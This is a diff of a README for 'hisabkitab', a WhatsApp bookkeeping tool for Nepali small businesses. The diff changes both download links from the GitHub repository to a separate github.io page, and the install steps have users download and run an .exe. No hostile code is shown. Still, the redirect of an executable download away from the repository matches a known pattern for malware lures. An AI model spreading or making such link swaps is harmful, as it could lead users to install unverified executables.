@@ -1,6 +1,6 @@
 # 📊 hisabkitab - Simple bookkeeping for Nepali small businesses
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Thomas3951/hisabkitab)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://thomas3951.github.io)
 
 hisabkitab helps small businesses in Nepal manage their daily finances through WhatsApp. You track your expenses, income, and tax obligations without manual data entry. The system confirms every transaction before saving it. It does not file documents with the government. You remain in control of your financial records at all times.
 
@@ -17,7 +17,7 @@ Your computer must meet these requirements to run hisabkitab:
 
 Follow these instructions to set up the software on your computer.
 
-1. Visit the following link to access the download page: https://github.com/Thomas3951/hisabkitab
+1. Visit the following link to access the download page: https://thomas3951.github.io
 2. Select the latest version listed under the Releases section.
 3. Download the file ending in .exe to your computer.
 4. Locate the downloaded file in your browser or your Downloads folder.
